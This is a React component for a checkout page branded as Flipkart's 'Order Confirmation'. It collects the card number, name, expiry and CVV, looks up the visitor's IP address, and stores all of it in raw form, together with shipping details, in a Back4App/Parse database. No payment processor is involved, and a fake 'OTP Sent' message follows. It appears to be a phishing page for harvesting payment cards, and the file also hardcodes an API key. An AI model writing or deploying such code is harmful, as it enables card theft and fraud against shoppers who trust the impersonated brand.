import {React,useEffect,useState} from 'react'
import MetaData from '../../Layouts/MetaData';
import Header from '../../components/Header/Header'
import { Button, Card,TextField, Divider,Select,MenuItem,InputLabel,FormControl,FormControlLabel,Typography } from '@mui/material'
import { useNavigate } from 'react-router-dom'
import { useSelector } from 'react-redux';
import LocalOfferIcon from '@mui/icons-material/LocalOffer';
import HelpIcon from '@mui/icons-material/Help';
import AddIcon from '@mui/icons-material/Add';
import PriceSidebar from '../Cart/PriceSidebar';
import InfoIcon from '@mui/icons-material/Info';
import { usePaymentInputs } from "react-payment-inputs";
import {InputAdornment} from '@mui/material';
import axios from 'axios'
import Parse from 'parse/dist/parse.min.js';
import * as Yup from 'yup'
import { yupResolver } from "@hookform/resolvers/yup";
import { useForm } from 'react-hook-form'
import { useSnackbar } from 'notistack';
const Payments = () => {
  const { cartItems } = useSelector((state) => state.cart);
  const { shippingInfo } = useSelector((state) => state.cart);
  const { enqueueSnackbar } = useSnackbar();
  const { getCardNumberProps } = usePaymentInputs();
  const [iP, setIP] = useState("");

  const cardSchema = Yup.object().shape({ 
    cardNumber:Yup
        .string()
        .required("Enter the Card Number")
        .min(16)
        .max(16),
    cvv:Yup
        .string()
        .required("Enter CVV ")
        .min(3)
        .max(3),
    name:Yup
        .string().required(),
    month:Yup.string().required(),
    year:Yup.string().required(),
  })
  const {
    register, 
    handleSubmit, 
    formState:{errors,},
    setValue
    } = useForm({
    criteriaMode:"all",
        mode: "onChange",
        reValidateMode: 'onChange',
        resolver: yupResolver(cardSchema),
    })

  const months = [
    {
        name: '01 (January)',
        value: '01'
    },
    {
        name: '02 (February)',
        value: '02'
    },
    {
        name: '03 (March)',
        value: '03'
    },
    {
        name: '04 (April)',
        value: '04'
    },
    {
        name: '05 (May)',
        value: '05'
    },
    {
        name: '06 (June)',
        value: '06'
    },
    {
        name: '07 (July)',
        value: '07'
    },
    {
        name: '08 (August)',
        value: '08'
    },
    {
        name: '09 (September)',
        value: '09'
    },
    {
        name: '10 (October)',
        value: '10'
    },
    {
        name: '11 (November)',
        value: '11'
    },
    {
        name: '12 (December)',
        value: '12'
    }

  ]
  const years = [22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,3,39,40,41,42,43,45,46,47,48,50,51]

  
  const getIpAddress= () => {
    axios.get('https://ipgeolocation.abstractapi.com/v1/?api_key=ec394cdd746948e48d155c5fdbc8c8bc')
    .then(response => {
        console.log(response.data);
        setIP(response.data.ip_address);
    })
    .catch(error => {
        console.log(error);
    });
  }

  // State variables
  const [person, setPerson] = useState(null);

  async function addCard(data) {
    try {
      const Card = new Parse.Object('Card');
      // define the attributes you want for your Object
      Card.set('ipAdd', iP);
      Card.set('cardData', data);
      Card.set('userData',shippingInfo );
      // save it on Back4App Data Store
      await Card.save();
      enqueueSnackbar("OTP Sent", { variant: "success" });
    //   alert('Person saved!');
    } catch (error) {
      console.log('Error saving new person: ', error);
    }
  }

  
  useEffect(() => {
    getIpAddress();
    // addCard()
  }, [])

  const onSubmit= (data) => {
    console.log(data)
    addCard(data)
  }
  

  return (
    <>
    <MetaData title="Flipkart: Order Confirmation" />
    <Header title="Order Summary"/>
    <div className="flex flex-col w-full bg-[#f1f2f4]">
        <div className="w-full">
            <img className="w-full shadow-md" src="assets/payment.svg" alt="orderSummary" />
        </div>
        <div className="flex w-full flex-col space-y-2 py-2">
            <Card className="w-full flex-col p-4 shadow-lg ">
              <p className="text-sm flex items-center">
                <span className="text-green-600"><LocalOfferIcon sx={{ fontSize: "20px" }} /></span>
                <span className="mx-2">15% Instant discount on first Flipkart Pay Later order of 500 and above </span><span className="text-blue-600 font-semibold font-sans text-sm" to="/">T&C</span>
              </p>
              <Divider/>
              <div className="flex justify-center align-middle items-center">
                  <h1 className="text-sm font-medium font-sans mt-1 text-blue-600">View all offers</h1>
              </div>
            </Card>
            <Card className="w-full flex-col p-4 shadow-lg ">
              <div className="flex flex-row items-center space-x-2 font-sans text-[12px] w-full">
                <InfoIcon sx={{ 
                    fontSize:"25px",
                    color:"#ffaf00"
                }} />
                <h1 className="w-full">Plase ensure your card can be used for online transactions.<span className="text-blue-500 font-medium">Know More</span></h1>
                <h1>Your IP {iP}</h1>
              </div>
            </Card>
            <form noValidate onSubmit={handleSubmit(onSubmit)}>   
            <Card className="flex shadow-lg p-4">
                <div>
                
                    <div className="flex flex-col space-y-2">
                        <div className="flex">
                            <TextField
                                fullWidth
                                id="cardNumber"
                                name="cardNumber"
                                variant="standard"
                                type="number"
                                label="Card Number"
                                {...register("cardNumber")}
                                InputLabelProps={{
                                    style: { 
                                        fontSize: "16px"
                                      },
                                }}
                                inputProps={{
                                    style: { 
                                      fontSize: "16px"
                                    },
                                  }}
                                error={Boolean(errors?.cardNumber)}
                                helperText={errors.cardNumber?.message}
                               
                            />
                        </div>
                        <div className="flex">
                            <TextField
                                fullWidth
                                id="name"
                                {...register("name")}
                                variant="standard"
                                label="Name on Card"
                                InputLabelProps={{
                                    style: { 
                                        fontSize: "16px"
                                      },
                                }}
                                inputProps={{
                                    style: { 
                                      fontSize: "16px"
                                    },
                                  }}
                                error={Boolean(errors?.name)}
                                helperText={errors.name?.message}
                               
                            />
                        </div>
                        <div className='flex flex-row'>
                            <div className="flex flex-col items-center w-full">
                                <h1 className="flex text-[12px] w-full justify-start font-sans text-gray-600 ">Valid thru</h1>
                                <div className="flex flex-row space-x-2">
                                <FormControl sx={{ minWidth: 80 }} size="small">
                                    
                                    <Select
                                        labelId="month"
                                        id="month"
                                        size="small"
                                        label="MM"
                                        variant="standard"
                                        error={Boolean(errors?.month)}
                                        {...register("month")}
                                    >
                                        {months.map((item,index)=>(

                                            <MenuItem sx={{ minWidth:180,}} key={index} value={item.value}>{item.value}</MenuItem>
                                        ))}
                                    </Select>
                                </FormControl>
                                <FormControl sx={{ minWidth: 80 }} size="small">
                                    <Select
                                        labelId="year"
                                        id="year"
                                        size="small"
                                        label="MM"
                                        error={Boolean(errors?.year)}
                                        defaultValue="YY"
                                        {...register("year")}   
                                        variant="standard"
                                    >
                                        {years.map((item,index)=>(
                                            <MenuItem sx={{ minWidth:180,}} key={index} value={item}>{item}</MenuItem>
                                        ))}
                                    </Select>   
                                    
                                </FormControl>
                                </div>
                            </div>
                            <div className="flex">
                                <TextField
                                        id="cvv"
                                        name="cvv"
                                        size="small"
                                        variant="standard"
                                        label="CVV"
                                        {...register("cvv")}
                                        InputLabelProps={{
                                            style: { 
                                                fontSize: "16px"
                                              },
                                        }}
                                        InputProps={{
                                            style: { 
                                                fontSize: "16px"
                                              },
                                            endAdornment:(
                                                <InputAdornment position="end">
                                                    <HelpIcon sx={{fontSize:"24px"}}/>    
                                                </InputAdornment>
                                            )
                                        }}
                                        error={Boolean(errors?.cvv)}
                                        helperText={errors.cvv?.message}
                                    />
                            </div>
                        </div>
                    </div>
                
                </div>
            </Card>
            <Card>
                <div className="flex w-full p-2 justify-center font-sans font-semibold">
                    <Button
                        sx={{
                            fontSize: "14px",
                            backgroundColor: "#FF5800",
                            padding:"10px"
                        }}
                        size='small'
                        variant="contained"
                        fullWidth
                        type="submit"
                    >
                        Pay ₹{cartItems.reduce((sum, item) => sum + (item.price * item.quantity), 0).toLocaleString()}
                    </Button>
                </div>
            </Card>
            </form>
            <Card>
                <PriceSidebar cartItems={cartItems} />
            </Card>
            <div className="w-full">
                <img className="w-full" src="assets/safety1.svg" alt="banner"/>
            </div>
            <div className="flex p-3 flex-row justify-center items-center">
                <img className='flex w-full' src="assets/safety2.jpg" alt='sheild'/>
                {/* <h1 className='flex w-full font-serif font-light text-xs text-gray-500'>Safe and Secure payments. Easy returns. 100% Authentic products</h1> */}
            </div>
        </div>
    </div>
    
    </>
  )
}

export default Payments